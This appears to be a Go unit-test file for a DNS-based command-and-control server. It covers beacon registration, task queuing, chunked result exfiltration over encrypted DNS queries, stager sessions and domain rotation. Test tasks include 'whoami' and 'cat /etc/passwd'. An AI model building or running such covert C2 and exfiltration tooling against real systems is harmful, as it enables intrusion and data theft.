package main

import (
	"encoding/base64"
	"fmt"
	"strings"
	"testing"
	"time"
)

// =============================================================================
// Crypto Tests
// =============================================================================

func TestGenerateAESKey(t *testing.T) {
	key1 := generateAESKey("password123")
	key2 := generateAESKey("password123")
	key3 := generateAESKey("different")

	if string(key1) != string(key2) {
		t.Error("Same passphrase should generate same key")
	}

	if string(key1) == string(key3) {
		t.Error("Different passphrases should generate different keys")
	}

	if len(key1) != 32 {
		t.Errorf("Key length should be 32 bytes, got %d", len(key1))
	}
}

func TestBase36Encoding(t *testing.T) {
	data := []byte("Hello World")
	encoded := base36Encode(data)
	decoded, err := base36Decode(encoded)

	if err != nil {
		t.Fatalf("Failed to decode: %v", err)
	}

	if string(decoded) != string(data) {
		t.Errorf("Decoded data mismatch. Got %s, want %s", string(decoded), string(data))
	}
}

func TestBase36EncodingEmpty(t *testing.T) {
	data := []byte("")
	encoded := base36Encode(data)
	decoded, err := base36Decode(encoded)

	if err != nil {
		t.Fatalf("Failed to decode empty: %v", err)
	}

	if string(decoded) != string(data) {
		t.Errorf("Empty data mismatch")
	}
}

func TestBase36EncodingBinary(t *testing.T) {
	// Test with binary data including null bytes
	data := []byte{0x00, 0x01, 0x02, 0xFF, 0xFE, 0xFD}
	encoded := base36Encode(data)
	decoded, err := base36Decode(encoded)

	if err != nil {
		t.Fatalf("Failed to decode binary: %v", err)
	}

	if len(decoded) != len(data) {
		t.Errorf("Binary data length mismatch. Got %d, want %d", len(decoded), len(data))
	}

	for i := range data {
		if decoded[i] != data[i] {
			t.Errorf("Binary data mismatch at index %d. Got %d, want %d", i, decoded[i], data[i])
		}
	}
}

func TestEncryptDecrypt(t *testing.T) {
	key := generateAESKey("testkey")
	plaintext := "Secret Message"

	encrypted, err := encryptAndEncode(plaintext, key)
	if err != nil {
		t.Fatalf("Encryption failed: %v", err)
	}

	decrypted, err := decodeAndDecrypt(encrypted, key)
	if err != nil {
		t.Fatalf("Decryption failed: %v", err)
	}

	if decrypted != plaintext {
		t.Errorf("Decrypted text mismatch. Got %s, want %s", decrypted, plaintext)
	}
}

func TestEncryptDecryptLargeData(t *testing.T) {
	key := generateAESKey("testkey")
	// Create a large plaintext (simulating command output)
	plaintext := strings.Repeat("A", 10000)

	encrypted, err := encryptAndEncode(plaintext, key)
	if err != nil {
		t.Fatalf("Large encryption failed: %v", err)
	}

	decrypted, err := decodeAndDecrypt(encrypted, key)
	if err != nil {
		t.Fatalf("Large decryption failed: %v", err)
	}

	if decrypted != plaintext {
		t.Errorf("Large decrypted text length mismatch. Got %d, want %d", len(decrypted), len(plaintext))
	}
}

func TestEncryptDecryptWrongKey(t *testing.T) {
	key1 := generateAESKey("testkey1")
	key2 := generateAESKey("testkey2")
	plaintext := "Secret Message"

	encrypted, err := encryptAndEncode(plaintext, key1)
	if err != nil {
		t.Fatalf("Encryption failed: %v", err)
	}

	_, err = decodeAndDecrypt(encrypted, key2)
	if err == nil {
		t.Error("Decryption with wrong key should fail")
	}
}

// =============================================================================
// C2Manager Initialization Tests
// =============================================================================

func TestC2ManagerInit(t *testing.T) {
	c2 := NewC2Manager(true, "testkey", StagerJitter{JitterMinMs: 100, JitterMaxMs: 200}, ":memory:", "example.com")
	if c2 == nil {
		t.Fatal("Failed to create C2Manager")
	}

	if string(c2.domain) != "example.com" {
		t.Errorf("Domain mismatch. Got %s, want example.com", c2.domain)
	}

	if c2.db == nil {
		t.Error("Database should be initialized")
	}
}

func TestC2ManagerEncryptionKey(t *testing.T) {
	c2 := NewC2Manager(false, "mykey123", StagerJitter{}, ":memory:", "test.com")

	key := c2.GetEncryptionKey()
	if len(key) != 32 {
		t.Errorf("AES key should be 32 bytes, got %d", len(key))
	}

	// Test that the same key is always returned
	key2 := c2.GetEncryptionKey()
	if string(key) != string(key2) {
		t.Error("GetEncryptionKey should return consistent key")
	}
}

// =============================================================================
// Beacon/Client Tests
// =============================================================================

func TestBeaconRegistration(t *testing.T) {
	c2 := NewC2Manager(true, "testkey", StagerJitter{JitterMinMs: 100, JitterMaxMs: 200}, ":memory:", "example.com")

	// Simulate beacon checkin using pipe-delimited format: CHK|id|hostname|username|os|arch
	beaconData := "CHK|test-beacon|host1|user1|linux|amd64"

	// Encrypt beacon data
	encoded, err := encryptAndEncode(beaconData, c2.aesKey)
	if err != nil {
		t.Fatalf("Failed to encrypt beacon data: %v", err)
	}

	// Construct query name: encoded_payload.example.com
	qname := encoded + ".example.com"

	resp, isC2 := c2.processBeaconQuery(qname, "127.0.0.1")

	if !isC2 {
		t.Error("Should be identified as C2 traffic")
	}

	if resp != "ACK" {
		t.Errorf("Expected ACK response, got %s", resp)
	}

	// Verify beacon is registered
	beacons := c2.GetBeacons()
	if len(beacons) != 1 {
		t.Errorf("Expected 1 beacon, got %d", len(beacons))
	}

	if beacons[0].ID != "test-beacon" {
		t.Errorf("Beacon ID mismatch. Got %s, want test-beacon", beacons[0].ID)
	}
}

func TestBeaconRegistrationMultiple(t *testing.T) {
	c2 := NewC2Manager(false, "testkey", StagerJitter{}, ":memory:", "example.com")

	// Register multiple beacons
	beacons := []struct {
		id       string
		hostname string
		username string
		os       string
		arch     string
	}{
		{"beacon1", "host1", "user1", "linux", "amd64"},
		{"beacon2", "host2", "user2", "windows", "amd64"},
		{"beacon3", "host3", "user3", "darwin", "arm64"},
	}

	for _, b := range beacons {
		data := fmt.Sprintf("CHK|%s|%s|%s|%s|%s", b.id, b.hostname, b.username, b.os, b.arch)
		encoded, _ := encryptAndEncode(data, c2.aesKey)
		c2.processBeaconQuery(encoded+".example.com", "127.0.0.1")
	}

	registered := c2.GetBeacons()
	if len(registered) != 3 {
		t.Errorf("Expected 3 beacons, got %d", len(registered))
	}
}

func TestBeaconUpdateOnReconnect(t *testing.T) {
	c2 := NewC2Manager(false, "testkey", StagerJitter{}, ":memory:", "example.com")

	beaconData := "CHK|test-beacon|host1|user1|linux|amd64"
	encoded, _ := encryptAndEncode(beaconData, c2.aesKey)

	// First check-in
	c2.processBeaconQuery(encoded+".example.com", "192.168.1.1")

	beacons := c2.GetBeacons()
	firstSeen := beacons[0].FirstSeen
	firstIP := beacons[0].IPAddress

	// Wait a bit
	time.Sleep(10 * time.Millisecond)

	// Second check-in from different IP
	c2.processBeaconQuery(encoded+".example.com", "192.168.1.2")

	beacons = c2.GetBeacons()
	if len(beacons) != 1 {
		t.Errorf("Should still have 1 beacon, got %d", len(beacons))
	}

	// FirstSeen should not change
	if beacons[0].FirstSeen != firstSeen {
		t.Error("FirstSeen should not change on reconnect")
	}

	// IP should be updated
	if beacons[0].IPAddress == firstIP {
		t.Error("IP address should be updated on reconnect")
	}

	// LastSeen should be updated
	if !beacons[0].LastSeen.After(firstSeen) {
		t.Error("LastSeen should be updated on reconnect")
	}
}

func TestTasking(t *testing.T) {
	c2 := NewC2Manager(true, "testkey", StagerJitter{JitterMinMs: 100, JitterMaxMs: 200}, ":memory:", "example.com")

	// Register beacon first using pipe-delimited format
	beaconData := "CHK|test-beacon|host1|user1|linux|amd64"
	encoded, _ := encryptAndEncode(beaconData, c2.aesKey)
	c2.processBeaconQuery(encoded+".example.com", "127.0.0.1")

	// Add task
	c2.AddTaskFromMaster("T1001", "test-beacon", "whoami")

	// Poll for task (same check-in message)
	resp, _ := c2.processBeaconQuery(encoded+".example.com", "127.0.0.1")

	// Response should be TASK|ID|COMMAND
	if len(resp) < 5 || resp[:5] != "TASK|" {
		t.Errorf("Expected TASK response, got %s", resp)
	}

	// Verify task is in response
	if !strings.Contains(resp, "whoami") {
		t.Errorf("Task response should contain command, got %s", resp)
	}
}

func TestTaskingMultiple(t *testing.T) {
	c2 := NewC2Manager(false, "testkey", StagerJitter{}, ":memory:", "example.com")

	// Register beacon
	beaconData := "CHK|test-beacon|host1|user1|linux|amd64"
	encoded, _ := encryptAndEncode(beaconData, c2.aesKey)
	c2.processBeaconQuery(encoded+".example.com", "127.0.0.1")

	// Add multiple tasks
	c2.AddTaskFromMaster("T1001", "test-beacon", "whoami")
	c2.AddTaskFromMaster("T1002", "test-beacon", "id")
	c2.AddTaskFromMaster("T1003", "test-beacon", "pwd")

	// First poll should get first task
	resp1, _ := c2.processBeaconQuery(encoded+".example.com", "127.0.0.1")
	if !strings.Contains(resp1, "whoami") {
		t.Errorf("First task should be whoami, got %s", resp1)
	}

	// Second poll should get second task
	resp2, _ := c2.processBeaconQuery(encoded+".example.com", "127.0.0.1")
	if !strings.Contains(resp2, "id") {
		t.Errorf("Second task should be id, got %s", resp2)
	}

	// Third poll should get third task
	resp3, _ := c2.processBeaconQuery(encoded+".example.com", "127.0.0.1")
	if !strings.Contains(resp3, "pwd") {
		t.Errorf("Third task should be pwd, got %s", resp3)
	}

	// Fourth poll should get ACK (no more tasks)
	resp4, _ := c2.processBeaconQuery(encoded+".example.com", "127.0.0.1")
	if resp4 != "ACK" {
		t.Errorf("Fourth poll should get ACK, got %s", resp4)
	}
}

func TestTaskToUnknownBeacon(t *testing.T) {
	c2 := NewC2Manager(false, "testkey", StagerJitter{}, ":memory:", "example.com")

	// Add task to non-existent beacon
	c2.AddTaskFromMaster("T1001", "unknown-beacon", "whoami")

	// The task should be stored but not deliverable
	beacons := c2.GetBeacons()
	if len(beacons) != 0 {
		t.Errorf("Should have no beacons, got %d", len(beacons))
	}
}

func TestResultMetaProcessing(t *testing.T) {
	c2 := NewC2Manager(false, "testkey", StagerJitter{}, ":memory:", "example.com")

	// Register beacon and send task
	beaconData := "CHK|test-beacon|host1|user1|linux|amd64"
	encoded, _ := encryptAndEncode(beaconData, c2.aesKey)
	c2.processBeaconQuery(encoded+".example.com", "127.0.0.1")
	c2.AddTaskFromMaster("T1001", "test-beacon", "cat /etc/passwd")

	// Deliver task
	c2.processBeaconQuery(encoded+".example.com", "127.0.0.1")

	// Send RESULT_META
	metaData := "RESULT_META|test-beacon|T1001|5000|10"
	metaEncoded, _ := encryptAndEncode(metaData, c2.aesKey)
	resp, isC2 := c2.processBeaconQuery(metaEncoded+".example.com", "127.0.0.1")

	if !isC2 {
		t.Error("RESULT_META should be recognized as C2 traffic")
	}

	if resp != "ACK" {
		t.Errorf("RESULT_META should get ACK, got %s", resp)
	}

	// Verify expected result is tracked
	c2.mutex.RLock()
	expected, exists := c2.expectedResults["T1001"]
	c2.mutex.RUnlock()

	if !exists {
		t.Error("Expected result should be tracked")
	}

	if expected.TotalChunks != 10 {
		t.Errorf("TotalChunks should be 10, got %d", expected.TotalChunks)
	}

	if expected.TotalSize != 5000 {
		t.Errorf("TotalSize should be 5000, got %d", expected.TotalSize)
	}
}

func TestDataChunkProcessing(t *testing.T) {
	c2 := NewC2Manager(false, "testkey", StagerJitter{}, ":memory:", "example.com")

	// Register beacon
	beaconData := "CHK|test-beacon|host1|user1|linux|amd64"
	encoded, _ := encryptAndEncode(beaconData, c2.aesKey)
	c2.processBeaconQuery(encoded+".example.com", "127.0.0.1")
	c2.AddTaskFromMaster("T1001", "test-beacon", "whoami")

	// Deliver task
	c2.processBeaconQuery(encoded+".example.com", "127.0.0.1")

	// Send result meta
	metaData := "RESULT_META|test-beacon|T1001|100|2"
	metaEncoded, _ := encryptAndEncode(metaData, c2.aesKey)
	c2.processBeaconQuery(metaEncoded+".example.com", "127.0.0.1")

	// Send DATA chunks (format: DATA|id|taskID|chunkIndex|chunk|timestamp)
	chunk1Data := base64.StdEncoding.EncodeToString([]byte("root"))
	dataMsg1 := fmt.Sprintf("DATA|test-beacon|T1001|0|%s|%d", chunk1Data, time.Now().Unix())
	data1Encoded, _ := encryptAndEncode(dataMsg1, c2.aesKey)
	resp1, isC2 := c2.processBeaconQuery(data1Encoded+".example.com", "127.0.0.1")

	if !isC2 {
		t.Error("DATA should be recognized as C2 traffic")
	}

	if resp1 != "ACK" {
		t.Errorf("DATA chunk should get ACK, got %s", resp1)
	}
}

// =============================================================================
// Stager Tests
// =============================================================================

func TestStagerSessionCreation(t *testing.T) {
	c2 := NewC2Manager(false, "testkey", StagerJitter{}, ":memory:", "example.com")

	// Test STG message parsing (without Master, should fail gracefully)
	stgData := "STG|192.168.1.100|linux|amd64"
	encoded := base36EncodeString(stgData)

	_, isC2 := c2.processBeaconQuery(encoded+".example.com", "192.168.1.100")

	// Without Master or cache, STG should return false (no cache available)
	// This is expected behavior
	if isC2 {
		t.Log("STG processed (cache available)")
	} else {
		t.Log("STG not processed (no cache, no Master) - expected")
	}
}

func TestStagerMessageParsing(t *testing.T) {
	// Test that STG messages are properly parsed
	testCases := []struct {
		msg      string
		valid    bool
		os       string
		arch     string
		clientIP string
	}{
		{"STG|192.168.1.1|linux|amd64", true, "linux", "amd64", "192.168.1.1"},
		{"STG|10.0.0.1|windows|x86", true, "windows", "x86", "10.0.0.1"},
		{"STG|172.16.0.1|darwin|arm64", true, "darwin", "arm64", "172.16.0.1"},
		{"STG|invalid", false, "", "", ""},
		{"STG", false, "", "", ""},
	}

	for _, tc := range testCases {
		parts := strings.Split(tc.msg, "|")
		valid := len(parts) >= 4 && parts[0] == "STG"

		if valid != tc.valid {
			t.Errorf("STG message '%s' validity mismatch. Got %v, want %v", tc.msg, valid, tc.valid)
		}

		if valid && tc.valid {
			if parts[2] != tc.os {
				t.Errorf("OS mismatch for '%s'. Got %s, want %s", tc.msg, parts[2], tc.os)
			}
			if parts[3] != tc.arch {
				t.Errorf("Arch mismatch for '%s'. Got %s, want %s", tc.msg, parts[3], tc.arch)
			}
		}
	}
}

func TestStagerChunkMessageParsing(t *testing.T) {
	// Test CHUNK message format
	testCases := []struct {
		msg       string
		valid     bool
		chunkIdx  string
		ip        string
		sessionID string
	}{
		{"CHUNK|0|192.168.1.1|stg_abcd", true, "0", "192.168.1.1", "stg_abcd"},
		{"CHUNK|10|10.0.0.1|session123", true, "10", "10.0.0.1", "session123"},
		{"CHUNK|invalid", false, "", "", ""},
		{"CHUNK", false, "", "", ""},
	}

	for _, tc := range testCases {
		parts := strings.Split(tc.msg, "|")
		valid := len(parts) >= 4 && parts[0] == "CHUNK"

		if valid != tc.valid {
			t.Errorf("CHUNK message '%s' validity mismatch. Got %v, want %v", tc.msg, valid, tc.valid)
		}

		if valid && tc.valid {
			if parts[1] != tc.chunkIdx {
				t.Errorf("ChunkIdx mismatch for '%s'. Got %s, want %s", tc.msg, parts[1], tc.chunkIdx)
			}
			if parts[2] != tc.ip {
				t.Errorf("IP mismatch for '%s'. Got %s, want %s", tc.msg, parts[2], tc.ip)
			}
			if parts[3] != tc.sessionID {
				t.Errorf("SessionID mismatch for '%s'. Got %s, want %s", tc.msg, parts[3], tc.sessionID)
			}
		}
	}
}

func TestDeterministicSessionID(t *testing.T) {
	// Test that session IDs are deterministic
	ip := "192.168.1.100"
	binaryID := "binary123"

	id1 := generateDeterministicSessionID(ip, binaryID)
	id2 := generateDeterministicSessionID(ip, binaryID)

	if id1 != id2 {
		t.Errorf("Session IDs should be deterministic. Got %s and %s", id1, id2)
	}

	// Different inputs should produce different IDs
	id3 := generateDeterministicSessionID("192.168.1.101", binaryID)
	if id1 == id3 {
		t.Error("Different IPs should produce different session IDs")
	}

	id4 := generateDeterministicSessionID(ip, "binary456")
	if id1 == id4 {
		t.Error("Different binary IDs should produce different session IDs")
	}

	// Should have stg_ prefix
	if !strings.HasPrefix(id1, "stg_") {
		t.Errorf("Session ID should have stg_ prefix, got %s", id1)
	}
}

// =============================================================================
// Exfil Tests
// =============================================================================

func TestExfilFrameProcessingNil(t *testing.T) {
	c2 := NewC2Manager(false, "testkey", StagerJitter{}, ":memory:", "example.com")

	// Test nil frame handling
	ack, err := c2.ProcessExfilFrame(nil, "127.0.0.1")

	if ack {
		t.Error("Nil frame should not be acknowledged")
	}

	if err == nil {
		t.Error("Nil frame should return error")
	}
}

func TestExfilFrameInit(t *testing.T) {
	c2 := NewC2Manager(false, "testkey", StagerJitter{}, ":memory:", "example.com")

	// Create init frame
	frame := &ExfilFrame{
		Phase:      ExfilFrameInit,
		SessionTag: "E01",
		Counter:    100, // total frames
		Flags:      FrameEnvelopeFlagInit,
	}

	ack, err := c2.ProcessExfilFrame(frame, "127.0.0.1")

	if err != nil {
		t.Errorf("Init frame should not error: %v", err)
	}

	if !ack {
		t.Error("Init frame should be acknowledged")
	}

	// Verify tracker was created
	tracker, ok := c2.getExfilTagTracker("E01")
	if !ok {
		t.Error("Tracker should be created for init frame")
	}

	if tracker.TotalFrames != 100 {
		t.Errorf("TotalFrames should be 100, got %d", tracker.TotalFrames)
	}
}

func TestExfilTagTracker(t *testing.T) {
	c2 := NewC2Manager(false, "testkey", StagerJitter{}, ":memory:", "example.com")

	// Test tag normalization (should be uppercase)
	tag := "e01"
	now := time.Now()

	c2.mutex.Lock()
	tracker := c2.ensureExfilTagTrackerLocked(tag, now)
	c2.mutex.Unlock()

	if tracker == nil {
		t.Fatal("Tracker should be created")
	}

	// Retrieve with different case
	retrieved, ok := c2.getExfilTagTracker("E01")
	if !ok {
		t.Error("Should find tracker with uppercase tag")
	}

	// getExfilTagTracker returns a copy, so compare Tag values instead of pointers
	if retrieved.Tag != tracker.Tag {
		t.Errorf("Should return tracker with same tag, got %s vs %s", retrieved.Tag, tracker.Tag)
	}

	// Delete tracker
	c2.deleteExfilTagTracker(tag)

	_, ok = c2.getExfilTagTracker(tag)
	if ok {
		t.Error("Tracker should be deleted")
	}
}

func TestExfilSessionCreation(t *testing.T) {
	c2 := NewC2Manager(false, "testkey", StagerJitter{}, ":memory:", "example.com")

	sessionID := "abcd1234"
	jobID := "job001"
	clientIP := "192.168.1.100"

	session := c2.ensureExfilSession(sessionID, jobID, clientIP)

	if session == nil {
		t.Fatal("Session should be created")
	}

	if session.SessionID != sessionID {
		t.Errorf("SessionID mismatch. Got %s, want %s", session.SessionID, sessionID)
	}

	if session.JobID != jobID {
		t.Errorf("JobID mismatch. Got %s, want %s", session.JobID, jobID)
	}

	if session.ClientIP != clientIP {
		t.Errorf("ClientIP mismatch. Got %s, want %s", session.ClientIP, clientIP)
	}

	if session.Status != "receiving" {
		t.Errorf("Status should be 'receiving', got %s", session.Status)
	}

	// Ensure returns same session
	session2 := c2.ensureExfilSession(sessionID, jobID, clientIP)
	if session != session2 {
		t.Error("Should return same session")
	}
}

func TestExfilCompletionFrameUnknownSession(t *testing.T) {
	c2 := NewC2Manager(false, "testkey", StagerJitter{}, ":memory:", "example.com")

	// Try to complete unknown session
	ack, err := c2.handleExfilCompletionFrame("UNKNOWN")

	if ack {
		t.Error("Unknown session should not be acknowledged")
	}

	if err == nil {
		t.Error("Unknown session should return error")
	}
}

// =============================================================================
// DNS Parsing Tests
// =============================================================================

func TestBuildTXTRData(t *testing.T) {
	testCases := []struct {
		input    string
		expected int // expected length (including length prefix)
	}{
		{"", 1},            // Empty string = single zero byte
		{"ACK", 4},         // 3 chars + 1 length byte
		{"NACK", 5},        // 4 chars + 1 length byte
		{strings.Repeat("A", 255), 256}, // Max single segment
	}

	for _, tc := range testCases {
		result := buildTXTRData(tc.input)
		if len(result) != tc.expected {
			t.Errorf("buildTXTRData(%q) length = %d, want %d", tc.input, len(result), tc.expected)
		}

		// Verify format: first byte is length
		if tc.input != "" {
			if int(result[0]) != len(tc.input) {
				t.Errorf("buildTXTRData(%q) length prefix = %d, want %d", tc.input, result[0], len(tc.input))
			}
		}
	}
}

func TestBuildTXTRDataLong(t *testing.T) {
	// Test with data longer than 255 bytes (should be split)
	input := strings.Repeat("B", 300)
	result := buildTXTRData(input)

	// Should have 255-byte chunk + 45-byte chunk
	// First chunk: 1 (len) + 255 (data) = 256
	// Second chunk: 1 (len) + 45 (data) = 46
	// Total: 302
	expectedLen := 256 + 46
	if len(result) != expectedLen {
		t.Errorf("Long TXT data length = %d, want %d", len(result), expectedLen)
	}

	// First segment length should be 255
	if result[0] != 255 {
		t.Errorf("First segment length = %d, want 255", result[0])
	}

	// Second segment length should be 45
	if result[256] != 45 {
		t.Errorf("Second segment length = %d, want 45", result[256])
	}
}

func TestLabelsHaveSuffix(t *testing.T) {
	testCases := []struct {
		nameParts   []string
		domainParts []string
		expected    bool
	}{
		{[]string{"sub", "example", "com"}, []string{"example", "com"}, true},
		{[]string{"a", "b", "example", "com"}, []string{"example", "com"}, true},
		{[]string{"example", "com"}, []string{"example", "com"}, true},
		{[]string{"other", "com"}, []string{"example", "com"}, false},
		{[]string{"com"}, []string{"example", "com"}, false},
		{[]string{}, []string{"example", "com"}, false},
		{[]string{"sub", "example", "com"}, []string{}, false},
	}

	for _, tc := range testCases {
		result := labelsHaveSuffix(tc.nameParts, tc.domainParts)
		if result != tc.expected {
			t.Errorf("labelsHaveSuffix(%v, %v) = %v, want %v", tc.nameParts, tc.domainParts, result, tc.expected)
		}
	}
}

func TestIsBase36Label(t *testing.T) {
	testCases := []struct {
		label    string
		expected bool
	}{
		{"abc123", true},
		{"0", true},
		{"abcdefghijklmnopqrstuvwxyz0123456789", true},
		{"ABC", false},  // uppercase not allowed
		{"abc-123", false}, // hyphen not allowed
		{"abc.123", false}, // dot not allowed
		{"", false},
	}

	for _, tc := range testCases {
		result := isBase36Label(tc.label)
		if result != tc.expected {
			t.Errorf("isBase36Label(%q) = %v, want %v", tc.label, result, tc.expected)
		}
	}
}

func TestIsLikelyTimestampLabel(t *testing.T) {
	testCases := []struct {
		label    string
		expected bool
	}{
		{"1234567890", true},   // 10 digits - valid timestamp
		{"12345678901", true},  // 11 digits - valid timestamp
		{"123456789", false},   // 9 digits - too short
		{"123456789012", false}, // 12 digits - too long
		{"12345678ab", false},  // contains letters
		{"", false},
	}

	for _, tc := range testCases {
		result := isLikelyTimestampLabel(tc.label)
		if result != tc.expected {
			t.Errorf("isLikelyTimestampLabel(%q) = %v, want %v", tc.label, result, tc.expected)
		}
	}
}

// =============================================================================
// Rate Limiter Tests
// =============================================================================

func TestForwardingRateLimiter(t *testing.T) {
	limiter := NewForwardingRateLimiter(5, 1) // 5 queries/sec, 1 sec pause

	// First 5 queries should be allowed
	for i := 0; i < 5; i++ {
		if !limiter.ShouldForward() {
			t.Errorf("Query %d should be allowed", i+1)
		}
	}

	// 6th query should trigger rate limit
	if limiter.ShouldForward() {
		t.Error("6th query should be rate limited")
	}

	// Should be paused
	if !limiter.IsPaused() {
		t.Error("Limiter should be paused")
	}

	// Wait for pause to expire
	time.Sleep(1100 * time.Millisecond)

	// Should be allowed again
	if !limiter.ShouldForward() {
		t.Error("Query should be allowed after pause expires")
	}
}

func TestForwardingRateLimiterStats(t *testing.T) {
	limiter := NewForwardingRateLimiter(3, 1)

	// Trigger rate limit
	for i := 0; i < 5; i++ {
		limiter.ShouldForward()
	}

	pauses, blocked, _ := limiter.GetStats()

	if pauses != 1 {
		t.Errorf("Should have 1 pause, got %d", pauses)
	}

	if blocked != 1 {
		t.Errorf("Should have 1 blocked query, got %d", blocked)
	}
}

// =============================================================================
// Known Domains Tests
// =============================================================================

func TestKnownDomains(t *testing.T) {
	c2 := NewC2Manager(false, "testkey", StagerJitter{}, ":memory:", "example.com")

	// Initially empty
	domains := c2.GetKnownDomains()
	if len(domains) != 0 {
		t.Errorf("Should have no known domains initially, got %d", len(domains))
	}

	// Set domains
	newDomains := []string{"test1.com", "test2.com", "test3.com"}
	c2.SetKnownDomains(newDomains)

	domains = c2.GetKnownDomains()
	if len(domains) != 3 {
		t.Errorf("Should have 3 known domains, got %d", len(domains))
	}

	// Verify domains
	for i, d := range newDomains {
		if domains[i] != d {
			t.Errorf("Domain mismatch at %d. Got %s, want %s", i, domains[i], d)
		}
	}
}

// =============================================================================
// Domain Update Task Tests
// =============================================================================

func TestAddDomainUpdateTask(t *testing.T) {
	c2 := NewC2Manager(false, "testkey", StagerJitter{}, ":memory:", "example.com")

	// Register beacon
	beaconData := "CHK|test-beacon|host1|user1|linux|amd64"
	encoded, _ := encryptAndEncode(beaconData, c2.aesKey)
	c2.processBeaconQuery(encoded+".example.com", "127.0.0.1")

	// Add domain update task
	taskID := c2.AddDomainUpdateTask("test-beacon", "update_domains:[\"new.com\"]")

	if taskID == "" {
		t.Error("Task ID should not be empty")
	}

	// Task ID should have D prefix
	if !strings.HasPrefix(taskID, "D") {
		t.Errorf("Domain task ID should have D prefix, got %s", taskID)
	}

	// Poll for task
	resp, _ := c2.processBeaconQuery(encoded+".example.com", "127.0.0.1")

	if !strings.Contains(resp, "update_domains") {
		t.Errorf("Should receive domain update task, got %s", resp)
	}
}

// =============================================================================
// Integration Tests
// =============================================================================

func TestFullBeaconWorkflow(t *testing.T) {
	c2 := NewC2Manager(false, "testkey", StagerJitter{}, ":memory:", "example.com")

	// 1. Beacon registers
	beaconData := "CHK|workflow-beacon|workstation1|admin|windows|amd64"
	encoded, _ := encryptAndEncode(beaconData, c2.aesKey)
	resp, isC2 := c2.processBeaconQuery(encoded+".example.com", "10.0.0.50")

	if !isC2 || resp != "ACK" {
		t.Fatalf("Registration failed: isC2=%v, resp=%s", isC2, resp)
	}

	// 2. Add task
	c2.AddTaskFromMaster("T2001", "workflow-beacon", "systeminfo")

	// 3. Beacon polls and gets task
	resp, _ = c2.processBeaconQuery(encoded+".example.com", "10.0.0.50")
	if !strings.HasPrefix(resp, "TASK|") {
		t.Fatalf("Should get task, got %s", resp)
	}

	// 4. Beacon sends result metadata
	metaMsg := "RESULT_META|workflow-beacon|T2001|1000|3"
	metaEncoded, _ := encryptAndEncode(metaMsg, c2.aesKey)
	resp, _ = c2.processBeaconQuery(metaEncoded+".example.com", "10.0.0.50")
	if resp != "ACK" {
		t.Fatalf("RESULT_META should get ACK, got %s", resp)
	}

	// 5. Beacon sends data chunks (format: DATA|id|taskID|chunkIndex|chunk|timestamp)
	for i := 0; i < 3; i++ {
		chunkData := base64.StdEncoding.EncodeToString([]byte(fmt.Sprintf("chunk%d", i)))
		dataMsg := fmt.Sprintf("DATA|workflow-beacon|T2001|%d|%s|%d", i, chunkData, time.Now().Unix())
		dataEncoded, _ := encryptAndEncode(dataMsg, c2.aesKey)
		resp, _ = c2.processBeaconQuery(dataEncoded+".example.com", "10.0.0.50")
		if resp != "ACK" {
			t.Fatalf("DATA chunk %d should get ACK, got %s", i, resp)
		}
	}

	// 6. Beacon sends completion (format: RESULT_COMPLETE|id|taskID|totalChunks|timestamp)
	completeMsg := fmt.Sprintf("RESULT_COMPLETE|workflow-beacon|T2001|3|%d", time.Now().Unix())
	completeEncoded, _ := encryptAndEncode(completeMsg, c2.aesKey)
	resp, _ = c2.processBeaconQuery(completeEncoded+".example.com", "10.0.0.50")
	if resp != "ACK" {
		t.Fatalf("RESULT_COMPLETE should get ACK, got %s", resp)
	}
}

func TestQueryNotForOurDomain(t *testing.T) {
	c2 := NewC2Manager(false, "testkey", StagerJitter{}, ":memory:", "example.com")

	// Query for different domain
	beaconData := "CHK|test-beacon|host1|user1|linux|amd64"
	encoded, _ := encryptAndEncode(beaconData, c2.aesKey)

	// Use different domain
	_, isC2 := c2.processBeaconQuery(encoded+".other.com", "127.0.0.1")

	if isC2 {
		t.Error("Query for other domain should not be processed as C2")
	}
}

func TestInvalidPayload(t *testing.T) {
	c2 := NewC2Manager(false, "testkey", StagerJitter{}, ":memory:", "example.com")

	// Random garbage that's not valid base36 or encrypted
	_, isC2 := c2.processBeaconQuery("notvalidpayload.example.com", "127.0.0.1")

	if isC2 {
		t.Error("Invalid payload should not be processed as C2")
	}
}
